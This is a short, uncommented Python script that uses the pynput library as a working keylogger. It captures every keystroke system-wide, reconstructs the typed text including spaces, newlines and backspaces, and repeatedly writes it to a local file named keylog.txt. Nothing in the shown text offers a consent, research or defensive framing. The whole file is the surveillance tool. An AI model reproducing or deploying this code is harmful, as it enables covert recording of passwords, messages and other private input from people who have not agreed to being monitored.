from pynput import keyboard

logged_text = []

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            logged_text.append(key.char)
        elif key == keyboard.Key.space:
            logged_text.append(' ')
        elif key == keyboard.Key.enter:
            logged_text.append('\n')
        elif key == keyboard.Key.backspace:
            if logged_text:
                logged_text.pop()
        else:
            pass  # Ignore other keys
    except:
        pass

    with open("keylog.txt", "w") as f:
        f.write("".join(logged_text))

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
